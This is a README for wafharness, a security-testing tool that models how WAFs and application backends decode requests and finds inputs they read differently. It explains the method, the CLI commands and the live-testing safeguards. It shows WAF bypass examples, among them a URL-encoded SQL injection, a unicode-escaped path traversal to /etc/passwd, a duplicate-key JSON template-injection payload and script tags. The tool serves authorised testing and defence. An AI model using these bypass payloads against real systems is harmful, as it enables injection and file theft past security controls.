<div align="center">

# wafharness

**A WAF bypass is not a payload. It is two parsers disagreeing.**

[![Tests](https://img.shields.io/badge/tests-226%20passing-4de4a4?style=flat-square)](tests)
[![Python](https://img.shields.io/badge/python-3.9%2B-45e3ff?style=flat-square)](pyproject.toml)
[![License](https://img.shields.io/badge/license-MIT-8d6bff?style=flat-square)](LICENSE)
[![Dependencies](https://img.shields.io/badge/runtime%20deps-0-ffc557?style=flat-square)](pyproject.toml)
[![Network](https://img.shields.io/badge/network-explicit-4de4a4?style=flat-square)](#safety)

</div>

---

Every WAF bypass in history is the same thing wearing different clothes: the WAF
and the backend both rewrite the incoming bytes through a cascade of decoders,
framing rules and normalisers, and then they disagree about what the request
*says*.

```
bytes -> [decode] -> [frame] -> [normalise] -> what the inspector sees
```

Change the order, drop a step, add one -- and the WAF inspects one request while
the application executes another. That is the entire mechanism.

So this project does not ship a payload list. It **models the cascades and
searches for the inputs where they diverge.**

> **This is not a payload catalogue with better marketing.** A payload list is a
> catalogue of *things that worked once*. A divergence is a statement about two
> parsers, and it stays true when the payload is rewritten.

---

## The idea in one screen

```console
$ wafharness find --waf cloudflare --backend php

  waf      cloudflare
           url_decode -> html_entity -> nfkc -> lowercase
  backend  php
           url_decode_plus

  GAP  2 witness(es) reach the backend without tripping the WAF

  witnesses
    [BYPASS] %27+OR+1%3D1%2D%2D+%2D
       waf sees     '+or+1=1--+-
       backend sees ' OR 1=1-- -
       cause        url_decode_plus
```

The WAF reads a literal `+`. PHP reads a space. The token `OR 1=1` exists only on
the backend's side -- so the WAF never sees a thing worth blocking.

That is not a trick that someone found once. It is `url_decode` and
`url_decode_plus` being different functions, and the tool found it by comparing
the two pipelines rather than by trying strings.

---

## What makes it general

`Stack` is the only concept. A stack is a named cascade:

| Part | What it means |
| :--- | :--- |
| `decode` | ordered decoders: percent, `+`-as-space, HTML entities, `\uXXXX`, `%uXXXX`, UTF-7, Latin-1, NUL strip, double-decode |
| `normalize` | ordered normalisers: NFKC, lowercase, whitespace collapse, SQL/HTML comment strip, backslash strip |
| `forbidden` | bytes rejected outright, before any rewriting |

Every WAF and every backend is just a stack. The engine does not know or care
which vendor it is looking at:

```python
waf     = stacks.get("cloudflare")     # url_decode -> html_entity -> nfkc -> lowercase
backend = stacks.get("java-spring")    # url_decode -> unicode_escape -> nfkc
gap     = engine.search_pair(waf, backend)
```

Ships with **16 WAFs** (Cloudflare, ModSecurity/CRS, Coraza, Google Cloud Armor,
AWS WAF, F5 ASM, Imperva, Akamai, Azure Front Door, Fastly, Sucuri, FortiWeb,
Wallarm, Radware, Citrix NetScaler, Barracuda) and **18 backends** (PHP,
Java/Spring, Kotlin/Ktor, Node/Express, Deno/Bun, Python/Werkzeug, .NET,
Go `net/http`, Ruby/Rack, Rust/Actix, Elixir/Plug, Perl/CGI, ColdFusion, classic
ASP, Swift/Vapor, Lua/OpenResty, plus a permissive upper bound and an identity
control).

Add your own in one line -- a stack is data, not code.

---

## Fingerprinting a target

The matrix is a hypothesis until you measure the deployment. `profile --url`
sends thirteen canaries to a real target and reads the answers; `--simulate`
replays a modelled stack offline for tests and documentation.

The console below is an offline fixture, not a live result:

```console
$ wafharness profile --simulate cloudflare

  target   simulated:cloudflare
  best fit cloudflare
  detected
    best_fit:cloudflare  0.85  ########
    url_decode           0.80  ########
    html_entity          0.80  ########
    nfkc                 0.80  ########
    lowercase            0.80  ########
    also:wallarm         0.80  ########
    also:azure-frontdoor 0.75  #######
    no:url_decode_plus   0.65  ######
    no:unicode_escape    0.65  ######
    no:percent_u         0.65  ######
    no:strip_nul         0.65  ######
    no:collapse_ws       0.65  ######
    no:strip_sql_comments 0.65  ######
```

Three signals, in order of strength:

| Signal | What it proves |
| :--- | :--- |
| **Reflection** | the response contains the canary's decoded marker -- the stack decoded it *and* the app echoed it |
| **Rejection** | the WAF blocked the canary while allowing the control |
| **Silence** | neither; recorded with near-zero weight |

A control request is sent first and reused for every canary, so thirteen canaries
cost fourteen requests. Without it, "the server returned 403" would mean nothing:
a target that 403s everything is not a WAF deciding about your payload.

### Absence is evidence too

A canary that comes back **still encoded** proves the transform is *missing*, and
that is recorded explicitly as `no:url_decode_plus`. Detecting what a stack does
not do is often what separates two candidates. A profile made entirely of
absences is a real finding -- the target reflects the raw value -- not a failure.

### Ambiguity is reported, not hidden

```console
$ wafharness profile --simulate php
  notes
    ambiguous: asp-classic, coldfusion, deno-bun, elixir-plug, go-net-http,
    kotlin-ktor, lua-openresty, node-express, perl-cgi, php, python-werkzeug,
    ruby-rack, rust-actix, swift-vapor all fit equally (0.50); the canaries
    cannot distinguish them -- add a canary that separates these stacks
```

Fourteen backends share `url_decode_plus` and nothing else observable, so the
honest answer is "one of these fourteen". The leading label (`asp-classic`) is
alphabetical, not a fingerprint; an earlier version also mistook the sort order
for an answer.

Run it offline with no network at all:

```bash
wafharness profile --simulate f5-asm     # pretend the target runs this stack
wafharness identify --simulate f5-asm    # same, as a labelled identity
wafharness canaries                      # the thirteen discriminating inputs
wafharness list-frames                   # the fourteen message frames and their
                                         # duplicate-key precedence
```

---

## Live measurement: OWASP CRS Sandbox

`crs` is a live path that does not require a deployed application. It sends the
same thirteen canaries to a CRS sandbox in detection mode and reports the actual
rule IDs that fired. The OWASP public sandbox is provided for exactly this; its
policy permits automated attack-payload testing at ten requests per second or
less, so the default delay is 0.2s.

```console
$ wafharness crs

  sandbox  https://sandbox.coreruleset.org/
  engine   apache

    percent          allowed   -
    percent-double   allowed   -
    plus             allowed   -
    html-entity      allowed   -
    unicode-escape   DETECTED  920540, 949110, 980170
    percent-u        allowed   -
    nul              DETECTED  920270, 949110, 980170
    utf7             allowed   -
    rfc2047          allowed   -
    fullwidth        allowed   -
    whitespace       allowed   -
    case             allowed   -
    sql-comment      allowed   -

  2/13 canaries triggered CRS; 4 unique rules
  rule ids: 920270, 920540, 949110, 980170
```

Those rule IDs came back from the live sandbox, not from a model. Pick another
engine or rule set with `--engine nginx`, `--crs-version v4-lts`, or
`--paranoia 2`; repeat runs with `--json` for machine-readable output.

---

## Direct live comparison: front door vs origin

The offline matrix predicts where a WAF and a backend *could* disagree. If you
can reach both sides of a deployment, `compare` measures the disagreement
instead. It sends the same bytes to the WAF-fronted endpoint and to the origin,
then compares status, reflected marker and body shape:

```console
$ wafharness compare \
      --front https://shop.example/search \
      --origin http://10.0.0.12:8080/search --yes

  front    https://shop.example/search
  origin   http://10.0.0.12:8080/search
  control  front 200 / origin 200

    percent            200 / 200  same
    percent-double     200 / 200  same
    plus               200 / 200  same
    html-entity        200 / 200  same
    unicode-escape     403 / 200  front-blocked  front refused; origin accepted
    ...

  1/13 live divergences
```

The verdicts are evidence, not inference:

| Verdict | Meaning |
| :--- | :--- |
| `front-blocked` | the front door refused bytes the origin accepted |
| `origin-sees-payload` | the origin reflected the marker; the front door did not |
| `body-diverges` | both accepted, but the responses differ materially |
| `origin-blocked` | the origin refused; the front door did not |
| `same` / `both-blocked` | no live divergence observed |

One control and thirteen canaries go to each endpoint: **28 requests**, paced at
0.3 s by default. Both endpoints must be authorised. A `body-diverges` row is
weaker than a status difference: dynamic pages can differ on their own, so the
control response is shown beside it.

This does not remove the offline matrix. It answers a different question, and
the matrix is still how the tool chooses which transformations are worth
sending. When both sides are reachable, though, the live comparison is the one
that produces evidence rather than a hypothesis.

---

## Single-URL confirmation: your own domain

If you own the target and can give only one URL, `confirm` is the shortest path
from a domain to evidence:

```console
$ wafharness confirm --url https://your-own-domain.example --yes

  hypothesis  cloudflare vs java-spring (fit 1.00)
  verdict     CANDIDATE
  note        2 witness(es) passed the WAF; no marker was reflected
  note        this is a candidate, not a confirmed bypass: the application may
              have rewritten or ignored the value

  target   https://your-own-domain.example
  sent     4 request(s)
  delivered  3   blocked 1   reflected 0
  ...
```

It sends the 14 fingerprint canaries, chooses the best-supported modelled pair,
then sends one control plus at most three witnesses. The verdict is deliberately
conservative:

| Verdict | What was observed |
| :--- | :--- |
| `CONFIRMED` | a witness passed the WAF and its marker came back in the response |
| `CANDIDATE` | a witness passed, but the response did not reflect it |
| `BLOCKED` | every witness was blocked; the model did not transfer |
| `INCONCLUSIVE` | the control was blocked, or no response was interpretable |
| `NO-WITNESSES` | the selected model produced nothing to send |

`confirm` exits 0 only for `CONFIRMED`; every other verdict exits 1.

`CONFIRMED` is still not a mathematical proof of exploitability. A single URL
cannot prove that the value reached an interpreter, only that the WAF allowed it
and something echoed the marker. For a true front-door/origin differential, add
an echo endpoint and use `compare`; that is the stronger test.

```bash
wafharness confirm --url https://your-own-domain.example --yes
wafharness confirm --url https://your-own-domain.example --yes \
                   --waf cloudflare --backend php --max-witnesses 5
```

---

## Identify the type, verify the entry point, keep the payload

`identify` answers the first question professionally: is this a WAF or an
application, which modelled stack fits, what evidence supports it, and what are
the alternatives?

```console
$ wafharness identify --url https://your-own-domain.example

  target   https://your-own-domain.example
  type     WAF-like
  label    cloudflare
  fit      0.85
  evidence
    + url_decode 0.80
    + html_entity 0.80
    + nfkc 0.80
    + lowercase 0.80
  also     wallarm 0.80
  caveats
    ! ambiguous: the canaries cannot distinguish the alternatives
```

`verify` runs the whole chain. It fingerprints once, chooses the best-supported
pair, tests every named query parameter as an entry point, and stores the exact
request behind each verdict:

```bash
wafharness verify --url https://your-own-domain.example \
                  --param q --param search --save reports --yes
```

```console
  type        WAF-like
  hypothesis  cloudflare vs php (fit 1.00)
  entries
    query:q       CONFIRMED
    query:search  BLOCKED

  findings
    CONFIRMED  query:q          200  reflected=yes
      payload  %27+OR+1%3D1%2D%2D+%2D
      cause    url_decode_plus
      request  https://your-own-domain.example/?q=%2527%2BOR%2B1...
```

The saved JSON and Markdown contain the payload, its hex, the encoded URL, the
model cause, the response status and size, whether the marker was reflected, and
the verdict. That is the chain from *what the model expected* to *what the wire
confirmed*.

Two limits matter:

- **Entry points are named, not crawled.** `--param` is repeatable, but the tool
  does not brute-force parameter names. Automatic discovery is a scanner
  feature, and a noisy one; this tool tests the entry points you specify. The
  fingerprint uses the first `--param`, so put a benign, reflected parameter
  first.
- **`CONFIRMED` means the WAF let the bytes through and the response carried
  the marker.** It does not prove the value reached an evaluator. Use an echo
  origin with `compare` when you need the stronger front-door/origin
  differential.
- **Query parameters only, for now.** Headers, cookies and request bodies are
  modelled offline but not yet wired into `verify` as live entry points.

`verify` exits 0 only when at least one finding is `CONFIRMED`.

---

## From measurement to a plan

`plan` joins the two halves. It fingerprints a target, scores every modelled
cascade against the measured evidence, and searches the plausible WAF/backend
pairs **offline**. Witnesses are printed, never sent.

```console
$ wafharness plan --simulate cloudflare

  target   simulated:cloudflare
  best fit cloudflare
  side     waf
  evidence
    + url_decode           0.80
    + html_entity          0.80
    + nfkc                 0.80
    + lowercase            0.80
    - collapse_ws, percent_u, strip_nul, strip_sql_comments, unicode_escape, url_decode_plus

  plan
    1. cloudflare vs java-spring     fit 1.00  4 bypass
       [BYPASS] ..\u002f..\u002f..\u002f..\u002fetc\u002fpasswd
          cause: unicode_escape
          waf sees     ..\u002f..\u002f..\u002f..\u002fetc\u002fpasswd
          backend sees ../../../../etc/passwd
    2. cloudflare vs asp-classic     fit 1.00  2 bypass
       [BYPASS] %27+OR+1%3D1%2D%2D+%2D
          cause: url_decode_plus
          waf sees     '+or+1=1--+-
          backend sees ' OR 1=1-- -
```

The ranking is a statement about evidence, not about preference:

| Rule | Why |
| :--- | :--- |
| Positive evidence is weighted 0.65, absence 0.35 | failing to explain a transform the target demonstrably applies is a stronger contradiction than carrying one the canaries never exercised |
| Pair confidence uses only the measured side | the other side is *supposed* to be unknown; averaging would punish the correct WAF for pairing with an unseen backend |
| Ties are searched, not broken alphabetically | four stacks that fit equally are four hypotheses, not a winner |
| A backend-looking profile says so | the canaries cannot see which side of the deployment they reached; if the evidence fits the application, every WAF model is searched against it |

`--url` sends the same thirteen canaries as `profile`, and nothing else:

```bash
wafharness plan --url https://target.example/echo     # measure + rank
wafharness plan --simulate cloudflare --json          # offline, machine-readable
wafharness plan --profile reports/profile.json        # reuse a saved profile
wafharness plan --simulate cloudflare \
               --waf cloudflare --backend php          # pin both models
```

## Two layers: bytes and boundaries

Decoding decides what a byte means. **Framing decides where one field ends and
the next begins** -- and that boundary is negotiated by rules that differ far more
between implementations than decoding does.

```console
$ wafharness frames --pair json-first-wins json-last-wins

  json-first-wins vs json-last-wins            10 bypass   10 total
     [BYPASS] {"comment":"benign","comment":"{{7*7}}${7*7}"}
        left : "benign"
        right: "{{7*7}}${7*7}"
```

Same bytes, two readings. `json.loads` keeps one of the duplicate keys and
silently drops the other -- and *which* one it keeps is not part of any spec, so
different stacks choose differently. A WAF that validates the first key sees
`benign`; a backend that executes the last sees the payload.

| Frame | Rule modelled | Divergence against |
| :--- | :--- | :--- |
| `query-first-wins` / `query-last-wins` | duplicate key precedence | 9 witnesses |
| `query-semicolon` | `;` is a separator or part of the value | 1 |
| `multipart-strict` / `multipart-lenient` | is a bare `\n` a legal delimiter? | 10 |
| `multipart-rfc2047` | is `name=` RFC 2047 decoded? | 10 |
| `json-first-wins` / `json-last-wins` | duplicate key precedence | 10 |
| `header-first-wins` / `header-last-wins` | duplicate header precedence | 10 |
| `header-strict` / `header-lenient` | are bare `\n` and obs-fold legal? | 10 |
| `cookie-first-wins` / `cookie-last-wins` | duplicate cookie precedence | 9 |

**69 framing divergences** across the eight declared pairs, each attributable to
exactly one rule difference -- a witness that differs for three reasons cannot be
debugged, so the pairs are curated rather than cross-produced.

### The case that inspired the project

```
Content-Disposition: form-data; name="=?UTF-8?B?Y29tbWVudA?="
```

A framing that decodes encoded-words sees the field `comment` and can match a
rule for it. One that treats the value as opaque sees base64 and matches
nothing. Neither is wrong. That is the whole mechanism, and it has nothing to do
with PHP specifically.

---

## How the search works

The pipeline difference tells the engine which encoders to apply. It never
enumerates payloads blindly.

```
for every decode step the backend performs and the WAF does not:
    encode the payload with that step's inverse
```

`%253C` decodes once to `%3C` (inert text) and twice to `<`. So a backend that
decodes twice has a gap against a WAF that decodes once -- and the encoder for
that gap is `percent_encode_twice`.

Depth is bounded by `Budget` (default: two encoders). Unbounded derivation is a
denial of service against your own laptop, and real witnesses are rarely deep.

### Four outcomes, mutually exclusive

| Outcome | Meaning | Actionable |
| :--- | :--- | :--- |
| `HIDDEN_FROM_WAF` | backend reaches a token, WAF does not block | **yes** -- this is the bypass |
| `REWRITTEN` | neither blocks, but the two hops disagree | smuggling, not execution |
| `DEAD_END` | WAF blocks a witness that never mattered | no |
| `NO_GAP` | WAF blocks and the backend would have reached it anyway | no -- WAF did its job |

> A note on that last row: a blocked request is *not* a bypass, even if the
> backend would have executed it. The first draft of this engine had that
> inverted and cheerfully reported every blocked payload as a finding.

---

## The stack matrix

```console
$ wafharness matrix --top 8

  waf                backend           bypass  rewritten
  ------------------------------------------------------
  modsecurity-crs    java-spring            9          6
  aws-waf            java-spring            9          6
  akamai             java-spring            9          6
  azure-frontdoor    java-spring            9          6
  fastly             java-spring            9          6
  coraza             java-spring            9          6
  google-cloud-armor java-spring            9          6
  sucuri             java-spring            9          6
```

Java/Spring leads because `\uXXXX` escapes and NFKC folding are absent from most
WAF pipelines -- an under-modelled class, not a newly discovered bug. That is the
point: the matrix shows *where the modelling gaps are*, so you know what to go
and verify.

---

## Install and use

```bash
pip install .        # from this checkout; zero runtime dependencies
# pip install wafharness   # from PyPI once published
```

```bash
wafharness stacks                                   # list the known cascades
wafharness find --waf cloudflare --backend php      # search one pair
wafharness find --waf f5-asm --backend java-spring --json --save reports
wafharness matrix --depth 1                         # whole matrix
wafharness explain --waf akamai --backend dotnet \
                   --witness '%3Cscript%3E'
wafharness plan --simulate cloudflare               # measure, then rank
wafharness plan --url https://target.example/echo   # canaries only
wafharness identify --url https://your-own-target
wafharness verify --url https://your-own-target --param q --param search --yes
wafharness compare --front https://target --origin http://origin --yes
wafharness confirm --url https://your-own-target --yes
python -m wafharness stacks                         # module entry point
```

---

## Safety

The search is offline. Live canaries are a separate layer, and only the last
layer sends a witness.

| Layer | What it does | Can it send? |
| :--- | :--- | :--- |
| `find`, `frames`, `matrix`, `explain`, `stacks` | model parsers, search for divergences | **no** |
| `profile --simulate`, `plan --simulate` | fingerprint and plan against a simulated stack | **no** |
| `identify --url`, `profile --url`, `plan --url`, `crs` | fingerprint a live target or CRS sandbox with 13 canaries | yes, read-only canaries |
| `compare --yes` | send the same 13 canaries to a front door and an origin | **yes, 28 requests, gated** |
| `confirm --yes` | fingerprint one URL, then send a control plus up to 3 witnesses | **yes, 18 requests, gated** |
| `verify --yes` | fingerprint once, then test each named entry point | **yes, 14 + entries x (1 + witnesses), gated** |
| `send` | send the discovered witnesses | **yes, and gated twice** |

`compare`, `confirm` and `verify` require `--yes` because they send to live
hosts. `send` also requires `--yes` *and* has a `--dry-run` that prints exactly
what would be sent without sending it. Without `--yes` these commands print why
they refused and exit 2.

```console
$ wafharness send --url https://target --waf cloudflare --backend php

  Refusing to send.

  This command makes real requests to a real host. Confirm that you
  hold explicit authorisation for it, then re-run with --yes.
  Use --dry-run to see what would be sent without sending it.
```

When it does send, four constraints apply and none can be disabled by accident:

| Constraint | Default | Why |
| :--- | :--- | :--- |
| Sequential + delay | **3.0 s** | roughly "a human exploring a form", the rate a WAF is designed to tolerate |
| Request budget | **10** | a hard cap per run, so a loop cannot run away |
| Circuit breaker | **5 blocks** | a wall of 403s means the target has decided about you |
| Control request first | **on** | so a universal 403 is visible instead of being misread as "everything blocked" |

Every attempt is written to a receipt -- method, URL, status, size, duration,
timestamp -- which is both the report material and the evidence that the pacing
was respected.

## Honest limits

These matter more than the feature list.

- **The stacks are models, not measurements.** None was derived by
  reverse-engineering a live appliance for this project. Each comes from public
  documentation and the published behaviour of the underlying parser, and every
  entry says so in its `notes`. A divergence between two modelled stacks is a
  **hypothesis** until you confirm the stacks are really deployed.
- **A wrong model invents a bypass.** That is worse than a missing one, so where
  behaviour is version-dependent the model deliberately takes the simpler form.
- **A profile is evidence, not identification.** Thirteen canaries observe a
  handful of transforms. They cannot name a vendor, cannot see the backend
  through a WAF, and frequently leave several stacks tied. `plan` declares the
  tie and searches each candidate; it never turns a tie into a name.
- **A live target may not reflect.** Most applications echo nothing, so the
  primary signal is the WAF's block/allowed decision, which is weaker. A profile
  of silence is reported as such, not as a negative result.
- **A live comparison is not automatically a bypass.** `compare` shows that the
  two endpoints answered differently; it cannot prove the origin is the same
  application, that caching was bypassed, or that the difference is exploitable.
  Confirm the deployment path before calling it a finding.
- **No rule import yet.** The models are behavioural, not extracted from
  ModSecurity CRS or managed-rule bundles. That is the next layer, not a claim
  made by this one.

---

## Roadmap

| Stage | Status |
| :--- | :--- |
| Cascade model, encoders, divergence search | **done** |
| Stack matrix: 16 WAFs x 18 backends | **done** |
| Message framing (multipart, JSON, query, headers, cookies) | **done** |
| Empirical stack fingerprinting from canary probes | **done** |
| Measurement -> search join (`plan`) | **done** |
| Live CRS sandbox measurement (`crs`) | **done** |
| Direct live front-door vs origin comparison (`compare`) | **done** |
| Single-URL confirmation with bounded witness sending (`confirm`) | **done** |
| Professional identity labels (`identify`) | **done** |
| Entry-point verification and payload evidence chain (`verify`) | **done** |
| Sender with rate limiting and circuit breaker | **done** |
| Rule import: parse ModSecurity CRS / Cloudflare managed rules | later |

---

## Project layout

```
wafharness/
|-- models.py      Stack, Transform, Divergence, Profile
|-- transforms.py  the rewrite primitives (10 decode, 7 normalise)
|-- encoders.py    their inverses -- how witnesses are constructed
|-- stacks.py      16 WAF and 18 backend cascades
|-- engine.py      divergence search and classification
|-- framing.py     message boundaries: query, multipart, JSON, headers, cookies
|-- canaries.py    the thirteen discriminating probes
|-- crs.py         live CRS sandbox parsing and measurement
|-- live.py        direct front-door vs origin comparison
|-- confirm.py     single-URL evidence levels
|-- identity.py    WAF/application label, fit and alternatives
|-- finding.py     payload -> request -> response evidence chain
|-- fingerprint.py observed target -> Profile
|-- plan.py        Profile -> ranked hypotheses and witnesses
|-- report.py      console / JSON / Markdown
|-- sender.py      the only module that sends a witness
`-- cli.py         find, plan, identify, verify, compare, confirm, send, ...
tests/             226 offline tests
```

---

## Licence

MIT -- see [`LICENSE`](LICENSE).

> [!WARNING]
> **Authorised use only.** Model all you like; any request you build from the
> output must target systems you are explicitly authorised to test.
